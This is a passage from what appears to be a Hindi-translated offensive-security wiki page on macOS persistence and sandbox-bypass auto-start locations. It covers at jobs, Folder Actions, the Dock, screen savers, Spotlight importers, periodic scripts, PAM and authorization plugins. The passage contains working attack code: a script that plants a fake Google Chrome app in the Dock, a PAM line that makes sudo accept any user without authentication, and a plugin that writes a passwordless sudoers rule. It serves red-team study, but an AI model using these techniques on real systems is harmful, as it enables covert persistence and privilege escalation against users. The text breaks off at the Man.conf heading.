- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- लेकिन आपको **`at`** **execute** करना होगा और यह **enabled** होना चाहिए
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`at`** को **execute** करना आवश्यक है और यह **enabled** होना चाहिए

#### **विवरण**

`at` tasks को निश्चित समय पर **one-time tasks schedule** करने के लिए design किया गया है। cron jobs के विपरीत, `at` tasks execution के बाद automatically remove हो जाते हैं। यह ध्यान रखना महत्वपूर्ण है कि ये tasks system reboots के बाद भी persistent रहते हैं, जिससे कुछ conditions में वे potential security concerns बन जाते हैं।

**Default** रूप से ये **disabled** होते हैं, लेकिन **root** user इन्हें इस तरह **enable** कर सकता है:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
यह 1 घंटे में एक फ़ाइल बनाएगा:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
`atq:` का उपयोग करके job queue जांचें.
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
ऊपर हम दो scheduled jobs देख सकते हैं। हम `at -c JOBNUMBER` का उपयोग करके job का विवरण प्रदर्शित कर सकते हैं।
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> यदि AT tasks enabled नहीं हैं, तो बनाए गए tasks execute नहीं होंगे।

**job files** `/private/var/at/jobs/` पर मिल सकती हैं।
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
फ़ाइलनाम में queue, job number और उसके scheduled run होने का समय शामिल होता है। उदाहरण के लिए, `a0001a019bdcd2` को लेते हैं।

- `a` - यह queue है
- `0001a` - hex में job number, `0x1a = 26`
- `019bdcd2` - hex में समय। यह epoch के बाद बीते हुए minutes को दर्शाता है। `0x019bdcd2` decimal में `26991826` है। इसे 60 से multiply करने पर `1619509560` मिलता है, जो `GMT: 2021. April 27., Tuesday 7:46:00` है।

यदि हम job file को print करें, तो इसमें वही information मिलती है जो `at -c` का उपयोग करके मिली थी।

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- sandbox को bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- लेकिन Folder Actions को configure करने के लिए `System Events` से contact करने हेतु arguments के साथ `osascript` को call कर पाना आवश्यक है
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- इसमें Desktop, Documents और Downloads जैसी कुछ basic TCC permissions होती हैं

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- Root आवश्यक है
- **Trigger**: specified folder तक access
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: specified folder तक access

#### Description & Exploitation

Folder Actions ऐसे scripts होते हैं जो किसी folder में होने वाले changes, जैसे items को add या remove करना, अथवा folder window को open या resize करना जैसी अन्य actions के कारण automatically trigger होते हैं। इन actions का उपयोग विभिन्न tasks के लिए किया जा सकता है और इन्हें Finder UI या terminal commands के माध्यम से अलग-अलग तरीकों से trigger किया जा सकता है।

Folder Actions को set up करने के लिए आपके पास निम्न options होते हैं:

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) के साथ Folder Action workflow तैयार करके उसे service के रूप में install करना।
2. किसी folder के context menu में मौजूद Folder Actions Setup के माध्यम से manually script attach करना।
3. Programmatically Folder Action set up करने के लिए `System Events.app` को Apple Event messages भेजने हेतु OSAScript का उपयोग करना।
- यह method विशेष रूप से system में action embed करने के लिए उपयोगी है और persistence का एक स्तर प्रदान करता है।

निम्न script इस बात का example है कि Folder Action द्वारा क्या execute किया जा सकता है:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
ऊपर दी गई script को Folder Actions के लिए उपयोग योग्य बनाने हेतु, इसे compile करें:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Script compile होने के बाद, नीचे दिए गए script को execute करके Folder Actions सेट अप करें। यह script Folder Actions को globally enable करेगा और विशेष रूप से पहले से compiled script को Desktop folder से attach करेगा।
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
setup script को इसके साथ चलाएँ:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- GUI के माध्यम से इस persistence को लागू करने का तरीका यह है:

यह वह script है जिसे execute किया जाएगा:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
इसे यहाँ ले जाएँ:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
फिर, `Folder Actions Setup` app खोलें, **उस folder को चुनें जिसे आप watch करना चाहते हैं** और अपने मामले में **`folder.scpt`** चुनें (मेरे मामले में मैंने इसे output2.scp नाम दिया था):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

अब, यदि आप उस folder को **Finder** से खोलते हैं, तो आपकी script execute हो जाएगी।

यह configuration **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** में base64 format में stored थी।

अब, आइए GUI access के बिना इस persistence को तैयार करने का प्रयास करें:

1. **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** को backup करने के लिए `/tmp` में copy करें:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. आपके द्वारा अभी set किए गए Folder Actions को **remove** करें:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

अब हमारे पास एक empty environment है।

3. Backup file को copy करें: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. इस config को consume करने के लिए Folder Actions Setup.app खोलें: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> और यह मेरे लिए काम नहीं किया, लेकिन writeup में instructions ये हैं:(

### Dock shortcuts

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- sandbox bypass करने के लिए useful: [✅](https://emojipedia.org/check-mark-button)
- लेकिन system के अंदर एक malicious application installed होना आवश्यक है
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: जब user Dock के अंदर मौजूद app पर click करता है

#### विवरण और Exploitation

Dock में दिखाई देने वाली सभी applications plist में specified होती हैं: **`~/Library/Preferences/com.apple.dock.plist`**

सिर्फ इस command से **एक application add करना** possible है:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
कुछ **social engineering** का उपयोग करके आप dock के अंदर, उदाहरण के लिए, **Google Chrome** का **impersonate** कर सकते हैं और वास्तव में अपनी script execute कर सकते हैं:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Sandbox bypass के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
- एक बहुत specific action होना आवश्यक है
- आप दूसरे sandbox में पहुंचेंगे
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/Library/ColorPickers`
- Root आवश्यक है
- Trigger: `Use the color picker`
- `~/Library/ColorPickers`
- Trigger: `Use the color picker`

#### Description & Exploit

अपने code के साथ **color picker** bundle **Compile** करें (उदाहरण के लिए आप [**इसका उपयोग कर सकते हैं**](https://github.com/viktorstrate/color-picker-plus)) और एक constructor जोड़ें (जैसा कि [Screen Saver section](macos-auto-start-locations.md#screen-saver) में है), फिर bundle को `~/Library/ColorPickers` में copy करें।

इसके बाद, जब color picker trigger होगा, तो आपका code भी trigger होना चाहिए।

ध्यान दें कि आपकी library को load करने वाले binary में एक **बहुत restrictive sandbox** है: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Sandbox bypass करने के लिए उपयोगी: **नहीं, क्योंकि आपको अपना app execute करना होगा**
- TCC bypass: ???

#### Location

- एक specific app

#### Description & Exploit

Finder Sync Extension वाले application का एक example [**यहाँ मिल सकता है**](https://github.com/D00MFist/InSync)।

Applications में `Finder Sync Extensions` हो सकते हैं। यह extension उस application के अंदर जाएगा जिसे execute किया जाएगा। इसके अलावा, extension को अपना code execute करने में सक्षम होने के लिए इसे **किसी valid Apple developer certificate से signed होना चाहिए**, यह **sandboxed** होना चाहिए (हालाँकि relaxed exceptions जोड़े जा सकते हैं) और इसे कुछ इस तरह के साथ registered होना चाहिए:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- sandbox को bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
- लेकिन आप एक सामान्य application sandbox में पहुँच जाएंगे
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- `/System/Library/Screen Savers`
- Root आवश्यक है
- **Trigger**: screen saver चुनें
- `/Library/Screen Savers`
- Root आवश्यक है
- **Trigger**: screen saver चुनें
- `~/Library/Screen Savers`
- **Trigger**: screen saver चुनें

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### विवरण और Exploit

Xcode में एक नया project बनाएं और नया **Screen Saver** generate करने के लिए template चुनें। फिर, इसमें अपना code जोड़ें, उदाहरण के लिए logs generate करने के लिए निम्नलिखित code।

इसे **Build** करें और `.saver` bundle को **`~/Library/Screen Savers`** में copy करें। फिर, Screen Saver GUI खोलें और यदि आप बस उस पर क्लिक करें, तो इससे बहुत सारे logs generate होने चाहिए:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> ध्यान दें कि इस code को load करने वाले binary (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) के entitlements के अंदर **`com.apple.security.app-sandbox`** पाया जा सकता है, इसलिए आप **common application sandbox** के अंदर होंगे।

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- sandbox bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
- लेकिन अंत में आप एक application sandbox में होंगे
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- sandbox बहुत सीमित लगता है

#### Location

- `~/Library/Spotlight/`
- **Trigger**: spotlight plugin द्वारा managed extension वाली नई file बनाई जाती है।
- `/Library/Spotlight/`
- **Trigger**: spotlight plugin द्वारा managed extension वाली नई file बनाई जाती है।
- Root आवश्यक है
- `/System/Library/Spotlight/`
- **Trigger**: spotlight plugin द्वारा managed extension वाली नई file बनाई जाती है।
- Root आवश्यक है
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: spotlight plugin द्वारा managed extension वाली नई file बनाई जाती है।
- नई app आवश्यक है

#### Description & Exploitation

Spotlight macOS का built-in search feature है, जिसे users को उनके computers पर मौजूद **data तक तेज़ और व्यापक access** प्रदान करने के लिए बनाया गया है।\
इस तेज़ search capability को सक्षम करने के लिए, Spotlight एक **proprietary database** maintain करता है और **अधिकांश files को parse** करके एक index बनाता है, जिससे file names और उनके content दोनों में तेज़ी से searches की जा सकती हैं।

Spotlight का underlying mechanism 'mds' नामक एक central process पर आधारित है, जिसका अर्थ **'metadata server'** है। यह process पूरी Spotlight service को orchestrate करता है। इसके साथ कई 'mdworker' daemons होते हैं, जो अलग-अलग file types को index करने जैसे कई maintenance tasks करते हैं (`ps -ef | grep mdworker`)। ये tasks Spotlight importer plugins, या **".mdimporter bundles**", के माध्यम से संभव होते हैं, जो Spotlight को विभिन्न file formats के content को समझने और index करने में सक्षम बनाते हैं।

Plugins या **`.mdimporter`** bundles पहले बताए गए locations में स्थित होते हैं और यदि कोई नया bundle दिखाई देता है, तो वह एक minute के भीतर load हो जाता है (किसी service को restart करने की आवश्यकता नहीं होती)। इन bundles को यह indicate करना होता है कि वे कौन-से **file type और extensions manage कर सकते हैं**, ताकि Spotlight indicated extension वाली नई file बनने पर उनका उपयोग कर सके।

Loaded सभी `mdimporters` को running process से **find करना** संभव है:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
और उदाहरण के लिए **/Library/Spotlight/iBooksAuthor.mdimporter** का उपयोग इस प्रकार की फ़ाइलों (अन्य के अलावा `.iba` और `.book` extensions) को parse करने के लिए किया जाता है:
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> यदि आप किसी अन्य `mdimporter` का Plist check करते हैं, तो हो सकता है कि आपको **`UTTypeConformsTo`** entry न मिले। ऐसा इसलिए है क्योंकि यह एक built-in _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier) है और इसे extensions specify करने की आवश्यकता नहीं होती।
>
> इसके अलावा, System default plugins को हमेशा precedence मिलती है, इसलिए attacker केवल उन files तक access कर सकता है जिन्हें Apple के अपने `mdimporters` द्वारा अन्यथा index नहीं किया जाता।

अपना importer बनाने के लिए आप इस project से शुरुआत कर सकते हैं: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), फिर इसका name बदलें, **`CFBundleDocumentTypes`** बदलें और **`UTImportedTypeDeclarations`** add करें, ताकि यह उस extension को support करे जिसे आप support करना चाहते हैं, और उन्हें **`schema.xml`** में reflect करें।\
इसके बाद **`GetMetadataForFile`** function का code **change** करें, ताकि processed extension वाली file create होने पर आपका payload execute हो।

अंत में अपना नया **`.mdimporter` build करके** उसे पिछली तीन locations में से किसी एक पर copy करें और **logs को monitor करके** या **`mdimport -L.`** check करके देख सकते हैं कि यह कब load होता है।

### ~~Preference Pane~~

> [!CAUTION]
> ऐसा लगता है कि यह अब काम नहीं कर रहा है।

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- sandbox bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
- इसके लिए एक specific user action आवश्यक है
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

ऐसा लगता है कि यह अब काम नहीं कर रहा है।

## Root Sandbox Bypass

> [!TIP]
> यहाँ आपको **sandbox bypass** के लिए उपयोगी start locations मिल सकती हैं, जो आपको केवल किसी file में कुछ **write करके** कुछ execute करने की अनुमति देती हैं, जब आप **root** हों और/या अन्य **अजीब conditions** आवश्यक हों।

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- sandbox bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
- लेकिन आपका root होना आवश्यक है
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root आवश्यक है
- **Trigger**: जब समय आता है
- `/etc/daily.local`, `/etc/weekly.local` या `/etc/monthly.local`
- Root आवश्यक है
- **Trigger**: जब समय आता है

#### Description & Exploitation

Periodic scripts (**`/etc/periodic`**) execute होते हैं, क्योंकि **launch daemons** उन्हें `/System/Library/LaunchDaemons/com.apple.periodic*` में configured करते हैं। ध्यान दें कि `/etc/periodic/` में stored scripts को **file के owner के रूप में execute किया जाता है,** इसलिए यह potential privilege escalation के लिए काम नहीं करेगा।
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
**`/etc/defaults/periodic.conf`** में निष्पादित की जाने वाली अन्य आवधिक scripts भी निर्दिष्ट होती हैं:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
यदि आप `/etc/daily.local`, `/etc/weekly.local` या `/etc/monthly.local` में से किसी भी file को लिखने में सफल हो जाते हैं, तो वह **जल्दी या देर से execute होगी**।

> [!WARNING]
> ध्यान दें कि periodic script को **script के owner के रूप में execute किया जाएगा**। इसलिए यदि script का owner कोई regular user है, तो इसे उसी user के रूप में execute किया जाएगा (यह privilege escalation attacks को रोक सकता है)।

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- sandbox को bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
- लेकिन आपके पास root होना आवश्यक है
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- हमेशा root आवश्यक है

#### विवरण और Exploitation

चूंकि PAM macOS के अंदर आसान execution की तुलना में **persistence** और malware पर अधिक केंद्रित है, इसलिए यह blog विस्तृत explanation नहीं देगा, **इस technique को बेहतर ढंग से समझने के लिए writeups पढ़ें**।

PAM modules को इसके साथ check करें:
```bash
ls -l /etc/pam.d
```
PAM का दुरुपयोग करने वाली persistence/privilege escalation technique उतनी ही आसान है जितना कि module /etc/pam.d/sudo को modify करके शुरुआत में यह line जोड़ना:
```bash
auth       sufficient     pam_permit.so
```
तो यह कुछ ऐसा **दिखेगा**:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
और इसलिए **`sudo` का उपयोग करने का कोई भी प्रयास सफल होगा**।

> [!CAUTION]
> ध्यान दें कि यह directory TCC द्वारा protected है, इसलिए बहुत अधिक संभावना है कि user को access की अनुमति माँगने वाला prompt दिखाई देगा।

एक और अच्छा उदाहरण su है, जहाँ आप देख सकते हैं कि PAM modules को parameters देना भी संभव है (और आप इस file में backdoor भी डाल सकते हैं):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- sandbox bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
- लेकिन आपके पास root access होना चाहिए और अतिरिक्त configs बनाने होंगे
- TCC bypass: ???

#### Location

- `/Library/Security/SecurityAgentPlugins/`
- Root required
- Plugin का उपयोग करने के लिए authorization database को configure करना भी आवश्यक है

#### Description & Exploitation

आप एक authorization plugin बना सकते हैं, जिसे persistence बनाए रखने के लिए user के logs-in करने पर execute किया जाएगा। इनमें से कोई plugin बनाने के तरीके के बारे में अधिक जानकारी के लिए पिछली writeups देखें (और सावधान रहें, खराब तरीके से लिखा गया plugin आपको system से lock out कर सकता है और आपको recovery mode से अपने Mac को clean करना पड़ेगा)।
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**लोड करने के लिए** bundle को स्थान पर **Move** करें:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
अंत में इस Plugin को load करने के लिए **rule** जोड़ें:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** authorization framework को बताएगा कि authorization के लिए उसे **किसी external mechanism को call करना होगा**। इसके अलावा, **`privileged`** इसे root के रूप में execute करवाएगा।

इसे इस तरह trigger करें:
```bash
security authorize com.asdf.asdf
```
और फिर **staff group के पास sudo** access होना चाहिए (पुष्टि करने के लिए `/etc/sudoers` पढ़ें)।

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- sandbox को bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
- लेकिन आपको root होना चाहिए और user को man का उपयोग करना चाहिए
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/private/etc/man.conf`**
- Root required
- **`/private/etc/man.conf`**: जब भी man का उपयोग किया जाता है

#### Description & Exploit

